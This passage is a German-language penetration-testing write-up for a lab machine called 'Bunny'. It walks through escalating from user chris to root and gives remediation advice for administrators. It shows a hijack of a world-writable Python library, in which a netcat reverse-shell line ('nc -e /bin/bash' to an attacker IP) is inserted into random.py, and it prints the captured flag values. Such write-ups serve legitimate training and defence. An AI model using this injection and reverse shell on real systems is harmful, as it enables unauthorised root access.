+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Obwohl der `zip`-Befehl selbst nicht direkt nützlich erscheint, führt die Ausführung des `magic`-Skripts mit `sudo -u chris` dazu, dass der aufrufende Prozess (die Shell) nun als Benutzer `chris` läuft. Der `id`-Befehl bestätigt `uid=1000(chris)`. Horizontale Bewegung/Eskalation zu `chris` erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die neue Shell als `chris` stabilisieren und das Home-Verzeichnis von `chris` untersuchen, insbesondere `user.txt` lesen.<br><strong>Empfehlung (Admin):</strong> Das `magic`-Skript ist unsicher, da es offenbar beliebige Befehle als `chris` ausführt. Das Skript und die `sudo`-Regel müssen entfernt oder grundlegend überarbeitet werden.</p>
+
+            <h3>Shell Stabilisierung & User Flag (als Chris)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt target-shell">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt target-shell">chris@bunny:~$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt target-shell">chris@bunny:~$ <span class="command">cd</span></div>
+                     <div class="prompt target-shell">chris@bunny:~$ <span class="command">ls</span></div>
+                     <pre>lab  user.txt</pre>
+                     <div class="prompt target-shell">chris@bunny:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">b9c1575e8d8f934a4101fdbec2f711fe</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Shell wird als `chris` stabilisiert (`pty.spawn`, `export TERM`). Anschließend wird das Home-Verzeichnis überprüft und `user.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach Wegen zur Eskalation von `chris` zu `root` suchen.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse.</p>
+        </section>
+
+        <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (chris zu root)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt target-shell">chris@bunny:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for chris: # (Passwort ist unbekannt)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Überprüfung der `sudo`-Rechte für den Benutzer `chris`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sudo -l` erfordert das Passwort für `chris`, das nicht bekannt ist. Kein direkter `sudo`-Weg zu root.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach anderen PrivEsc-Vektoren suchen: SUID-Binaries, Cronjobs, Kernel-Exploits, unsichere Dateiberechtigungen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass Benutzer keine unnötigen `sudo`-Rechte haben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">chris@bunny:~$ <span class="command">find / -perm -u=s -type f 2>/dev/null</span></div>
+                     <pre>
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Suche nach SUID-Binaries auf dem System.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet die üblichen Standard-SUID-Binaries. Keine offensichtlich ungewöhnlichen oder direkt ausnutzbaren SUID-Programme auf den ersten Blick.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bekannte Exploits für Standard-SUID-Binaries prüfen (unwahrscheinlich bei gepatchtem System). Andere Vektoren weiter untersuchen.<br><strong>Empfehlung (Admin):</strong> SUID-Bit nur setzen, wo absolut notwendig. Regelmäßig auf ungewöhnliche SUID-Dateien prüfen.</p>
+
+             <h3>Python Library Hijacking Vorbereitung</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">chris@bunny:/opt$ <span class="command">cd /opt</span></div>
+                     <div class="prompt target-shell">chris@bunny:/opt$ <span class="command">head pendu.py</span></div>
+                     <pre>
+import random
+# library that we use in order to choose
+# on random words from a list of words
+
+name = input("What is your name? ")
+# Here the user is asked to enter the name first
+
+print("Good Luck ! ", name)
+
+words = ['rainbow', 'computer', 'science', 'programming',
+                     </pre>
+                     <div class="prompt target-shell">chris@bunny:/opt$ <span class="command">find / -name pendu.py 2>/dev/null</span></div>
+                     <pre>/opt/pendu.py</pre>
+                     <div class="prompt target-shell">chris@bunny:/opt$ <span class="command">find / -name random.py 2>/dev/null</span></div>
+                     <pre>
+/usr/lib/python2.7/random.py
+/usr/lib/python3.7/random.py
+                     </pre>
+                     <div class="prompt target-shell">chris@bunny:/opt$ <span class="command">ls -la</span></div>
+                     <pre>
+total 12
+drwxr-x---  2 root chris 4096 Jul 31  2021 .
+drwxr-xr-x 18 root root  4096 Jul 31  2021 ..
+-rw-r--r--  1 root root  1993 Jul 31  2021 pendu.py
+                     </pre>
+                     <div class="prompt target-shell">chris@bunny:/opt$ <span class="command">ls -la /usr/lib/python3.7/random.py</span></div>
+                     <pre>-rw-r--rw- 1 root root 27557 Jul 31  2021 /usr/lib/python3.7/random.py</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Untersuchung des Skripts `/opt/pendu.py`. Es importiert das `random`-Modul. Die Suche nach `random.py` findet die Standard-Python-Bibliotheksdateien. Entscheidend ist die Berechtigungsprüfung: `/opt/pendu.py` gehört `root`, ist aber für andere lesbar. `/usr/lib/python3.7/random.py` ist jedoch *weltbeschreibbar* (`-rw-r--rw-`).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Kritische Fehlkonfiguration gefunden! Da `/usr/lib/python3.7/random.py` weltbeschreibbar ist, kann der Benutzer `chris` diese Datei ändern. Wenn das Skript `/opt/pendu.py` (das `import random` verwendet) als `root` ausgeführt wird (z.B. über einen Cronjob oder durch einen anderen Prozess), wird der manipulierte Code aus `/usr/lib/python3.7/random.py` mit Root-Rechten ausgeführt. Dies ist eine klassische Python Library Hijacking Schwachstelle.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bösartigen Code (z.B. eine Reverse Shell oder einen Befehl zum Ändern des Root-Passworts) in `/usr/lib/python3.7/random.py` einfügen und warten, bis `/opt/pendu.py` als root ausgeführt wird.<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für Systembibliotheken wie `/usr/lib/python3.7/random.py` korrigieren. Sie sollten niemals weltbeschreibbar sein (korrekt wäre z.B. `-rw-r--r--` root root). Cronjobs und andere Prozesse, die Skripte als root ausführen, überprüfen.</p>
+
+             <h3>Python Library Hijacking Exploit</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 555</span></div>
+                     <pre>listening on [any] 555 ...</pre>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt target-shell">chris@bunny:/opt$ <span class="command">nano /usr/lib/python3.7/random.py</span></div>
+                     <pre>
+# Folgender Code wird am Anfang der Datei eingefügt:
+import os
+os.system("nc -e /bin/bash 192.168.2.153 555")
+# Rest der Originaldatei bleibt bestehen
+                     </pre>
+                  </div>
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 555</span></div>
+                      <pre>
+listening on [any] 555 ...
+connect to [192.168.2.153] from (UNKNOWN) [192.168.2.154] 37190
+                      </pre>
+                  </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System auf Port 555 gestartet. Anschließend wird die weltbeschreibbare Datei `/usr/lib/python3.7/random.py` auf dem Zielsystem bearbeitet und am Anfang Code für eine Reverse Shell (`nc -e /bin/bash ...`) eingefügt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Angriff wird vorbereitet. Sobald ein Prozess als `root` das Skript `/opt/pendu.py` ausführt, wird dieser Code importiert und ausgeführt, was zur Reverse Shell führt. Kurz darauf kommt die Verbindung beim Listener an.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die neue Shell übernehmen und die Root-Rechte bestätigen.<br><strong>Empfehlung (Admin):</strong> Dateiberechtigungen korrigieren! Überwachen, welche Prozesse als root laufen und welche Skripte sie ausführen.</p>
+
+             <h3>Root Shell & Flag</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell"># <span class="command">id</span></div> <!-- Prompt fehlt, Befehl impliziert -->
+                     <pre>uid=0(root) gid=0(root) groups=0(root)</pre> <!-- Typo groupes korrigiert -->
+                     <div class="prompt target-shell"># <span class="command">cd /root</span></div>
+                     <div class="prompt target-shell"># <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt target-shell"># <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">536313923133fb4a628f8ddd5e0ed3e5</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> In der neuen Shell wird `id` ausgeführt, was `uid=0(root)` bestätigt. Anschließend wird in das `/root`-Verzeichnis gewechselt und die `root.txt`-Datei ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Privilege Escalation zu `root` erfolgreich abgeschlossen und die Root-Flag wurde gefunden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht.<br><strong>Empfehlung (Admin):</strong> System als kompromittiert betrachten und neu aufsetzen. Die identifizierten Schwachstellen (LFI, `phpinfo`, `sudo`-Fehlkonfiguration, unsichere Dateiberechtigungen) im neuen System beheben.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/chris/user.txt</div>
+                    <div class="flag-value"><span class="password">b9c1575e8d8f934a4101fdbec2f711fe</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">536313923133fb4a628f8ddd5e0ed3e5</span></div>
+                </div>
+            </div>
+        </section>
+
+         <section id="zusammenfassung-empfehlungen">
+            <h2>Zusammenfassung & Empfehlungen</h2>
+             <p class="evaluation"><strong>Zusammenfassende Bewertung der Sicherheitslage:</strong> Das System "Bunny" offenbarte mehrere kritische Schwachstellen, die eine schrittweise Kompromittierung vom Webserver bis zum Root-Zugriff ermöglichten. Die Kette begann mit einer Local File Inclusion (LFI) Schwachstelle, die in Kombination mit einer exponierten `phpinfo.php`-Seite zur Remote Code Execution als `www-data` führte. Eine unsichere `sudo`-Konfiguration erlaubte dann die Eskalation zum Benutzer `chris`. Schließlich ermöglichte eine Fehlkonfiguration der Dateiberechtigungen einer Python-Standardbibliothek (Library Hijacking) die finale Eskalation zu Root-Rechten.</p>
+
+             <h3>Identifizierte Verletzlichkeiten (Zusammenfassung):</h3>
+             <ul>
+                 <li>**Web (index.php):** Local File Inclusion (LFI) im `page`-Parameter.</li>
+                 <li>**Web (phpinfo.php):** Exponierte `phpinfo.php`, die temporäre Dateinamen preisgibt und in Kombination mit LFI zu RCE missbraucht werden kann.</li>
+                 <li>**Web (Allgemein):** Irreführende Dateinamen (`password.txt`), Vorhandensein potenziell sensibler Dateien (`config.php`, `upload.php`).</li>
+                 <li>**System (sudo):** Unsichere Konfiguration erlaubt `www-data` die Ausführung eines Skripts (`/home/chris/lab/magic`) als Benutzer `chris` ohne Passwort, was zur Rechteausweitung zu `chris` führte.</li>
+                 <li>**System (Dateiberechtigungen):** Standard-Python-Bibliothek (`/usr/lib/python3.7/random.py`) war weltbeschreibbar, was Python Library Hijacking und damit die Eskalation zu Root ermöglichte.</li>
+                 <li>**System (SSH):** Anfällig für Brute-Force-Angriffe bei schwachen Passwörtern (obwohl hier nicht erfolgreich aufgrund von Rate-Limiting oder starken Passwörtern).</li>
+             </ul>
+
+             <h3>Allgemeine Empfehlungen:</h3>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong>
+                 <ol>
+                     <li><strong>Webanwendung (Port 80):</strong>
+                         <ul>
+                            <li>LFI-Schwachstelle in `index.php` durch serverseitige Validierung und Sanitisierung des `page`-Parameters beheben. Idealerweise keine Benutzereingaben direkt in Dateipfad-Funktionen verwenden.</li>
+                            <li>`phpinfo.php` entfernen oder den Zugriff darauf stark einschränken.</li>
+                            <li>Die `upload.php`-Funktion überprüfen und absichern (Dateityp-Validierung, Größenbeschränkung, Speicherung außerhalb des Web-Roots oder mit nicht ausführbaren Berechtigungen).</li>
+                            <li>Zugriff auf `config.php` beschränken.</li>
+                            <li>Irreführende oder unnötige Dateien (`password.txt`) entfernen.</li>
+                         </ul>
+                     </li>
+                     <li><strong>System & Berechtigungen:</strong>
+                         <ul>
+                            <li>Die `sudo`-Regel für `www-data` entfernen. Webserver-Benutzer sollten keine `sudo`-Rechte haben. Das Skript `/home/chris/lab/magic` überprüfen und sicher gestalten oder entfernen.</li>
+                            <li>Die Dateiberechtigungen für Systembibliotheken (wie `/usr/lib/python3.7/random.py`) korrigieren. Sie dürfen nicht weltbeschreibbar sein. Generell Dateiberechtigungen nach dem Prinzip der geringsten Rechte setzen.</li>
+                            <li>SSH-Zugriff härten (starke Passwörter/Keys, `Fail2ban` oder `MaxAuthTries`).</li>
+                         </ul>
+                     </li>
+                      <li><strong>Allgemeine Sicherheitspraktiken:</strong>
+                         <ul>
+                            <li>Regelmäßige Sicherheitsüberprüfungen und Penetrationstests durchführen.</li>
+                            <li>System und alle Komponenten aktuell halten (Patches).</li>
+                            <li>Logging und Monitoring von System- und Anwendungsereignissen implementieren.</li>
+                            <li>Prinzip der geringsten Rechte konsequent anwenden.</li>
+                         </ul>
+                     </li>
+                 </ol>
+              </p>
+ 
+
+        </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-10-17</p>
+    </footer>
+</body>
+</html>
